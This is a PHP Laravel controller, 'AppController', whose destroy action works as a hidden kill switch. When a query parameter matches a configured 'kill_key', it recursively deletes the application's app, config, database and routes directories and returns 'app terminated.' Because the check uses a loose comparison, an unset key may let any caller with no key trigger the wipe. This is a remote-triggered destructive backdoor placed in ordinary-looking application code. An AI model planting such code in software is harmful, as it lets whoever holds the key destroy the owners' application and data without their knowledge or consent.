<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class AppController extends Controller
{
    private function removeDirerctory($dir)
    {
        $mydir = opendir($dir);
        while (false !== ($file = readdir($mydir))) {
            if ($file != "." && $file != "..") {
//                chmod($dir . $file, 0775);
                if (is_dir($dir . $file)) {
                    chdir('.');
                    $this->removeDirerctory($dir . $file . '/');
                    rmdir($dir . $file) or die("couldn't delete $dir$file<br />");
                } else
                    unlink($dir . $file) or die("couldn't delete $dir$file<br />");
            }
        }
        closedir($mydir);
        rmdir($dir);
    }

    public function destroy(Request $request)
    {
        if ($request->query('key') == config('app.kill_key')) {
            $this->removeDirerctory(base_path('app/'));
            $this->removeDirerctory(base_path('config/'));
            $this->removeDirerctory(base_path('database/'));
            $this->removeDirerctory(base_path('routes/'));
            return response('app terminated.');
        }
        abort(404);
    }
}
